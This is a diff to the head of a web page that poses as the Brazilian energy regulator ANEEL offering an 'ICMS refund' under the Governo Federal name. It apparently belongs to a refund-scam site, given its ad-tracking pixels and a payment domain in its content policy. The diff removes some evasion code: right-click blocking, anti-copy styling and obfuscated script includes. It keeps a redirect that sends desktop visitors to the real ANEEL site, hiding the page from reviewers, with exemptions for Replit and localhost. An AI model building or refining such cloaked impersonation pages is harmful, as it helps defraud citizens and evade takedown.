@@ -3,68 +3,32 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.aneel.gov.br https://*.googleapis.com https://*.gstatic.com https://*.aresfun.com https://*.utmify.com.br https://*.for4payments.com.br data: blob:">
     <title>ANEEL - Restituição ICMS | Governo Federal</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="/security.min.css">
     
-    <!-- Script de proteção avançada com redirecionamento imediato se for desktop -->
+    <!-- Script básico de verificação de dispositivo móvel -->
     <script>
       (function() {
-        var _securitySetup = function() {
-          // Verificação básica de dispositivo móvel
-          var _isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) 
-                         && ('ontouchstart' in window || navigator.maxTouchPoints > 0)
-                         || typeof window.orientation !== 'undefined';
-          
-          // Permitir acesso em desenvolvimento
-          if (window.location.hostname === 'localhost' || window.location.hostname.includes('replit') || window.location.hostname.includes('127.0.0.1')) {
-            try {
-              console.log("Ambiente de desenvolvimento detectado, permitindo acesso via desktop.");
-              localStorage.setItem('_dvt', JSON.stringify(true));
-              
-              // Configurar modo de teste para o ambiente Replit
-              localStorage.setItem('_ddb', 'false');
-              localStorage.setItem('_scp', 'false');
-              return;
-            } catch(e) {}
-          }
-          
-          // Verificar cache anterior
-          try {
-            var cachedStatus = localStorage.getItem('_dvt');
-            if (cachedStatus !== null) {
-              _isMobile = JSON.parse(cachedStatus);
-            } else {
-              localStorage.setItem('_dvt', JSON.stringify(_isMobile));
-            }
-          } catch(e) {}
-          
-          // Redirecionar se não for mobile
-          if (!_isMobile) {
-            window.location.href = 'https://antigo.aneel.gov.br/';
-          }
-          
-          // Em modo de produção (não-Replit), adicionar proteções extras
-          if (!window.location.hostname.includes('replit')) {
-            // Bloquear clique direito
-            document.addEventListener('contextmenu', function(e) {
-              e.preventDefault();
-              return false;
-            });
-          }
-        };
+        // Verificação básica para ambiente de desenvolvimento
+        if (window.location.hostname === 'localhost' || 
+            window.location.hostname.includes('replit') || 
+            window.location.hostname.includes('127.0.0.1')) {
+          console.log("Ambiente de desenvolvimento detectado, permitindo acesso via desktop.");
+          localStorage.setItem('_dvt', 'true');
+          return;
+        }
         
-        // Executar imediatamente
-        _securitySetup();
+        // Verificação de dispositivo móvel para produção
+        var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        if (!isMobile && 
+            !window.location.hostname.includes('replit') && 
+            !window.location.hostname.includes('localhost')) {
+          window.location.href = 'https://antigo.aneel.gov.br/';
+        }
       })();
     </script>
-    
-    <!-- Scripts de segurança ofuscados com proteções adicionais -->
-    <script src="/src/security-script.js"></script>
-    <script src="/security.min.js"></script>
     
     <!-- UTMify Scripts -->
     <script
@@ -82,34 +46,6 @@
       a.setAttribute("defer", "");
       a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
       document.head.appendChild(a);
-    </script>
-    
-    <!-- Proteção contra cópia de conteúdo (somente em produção) -->
-    <style>
-      /* Em produção, o código abaixo será aplicado automaticamente */
-      .protect-content * {
-        -webkit-user-select: none;
-        -moz-user-select: none;
-        -ms-user-select: none;
-        user-select: none;
-      }
-      .protect-content input, 
-      .protect-content textarea, 
-      .protect-content [contenteditable="true"] {
-        -webkit-user-select: text;
-        -moz-user-select: text;
-        -ms-user-select: text;
-        user-select: text;
-      }
-    </style>
-    <script>
-      /* Script para aplicar a classe apenas em produção */
-      document.addEventListener('DOMContentLoaded', function() {
-        if (!window.location.hostname.includes('replit') && 
-            !window.location.hostname.includes('localhost')) {
-          document.body.classList.add('protect-content');
-        }
-      });
     </script>
   </head>
   <body>
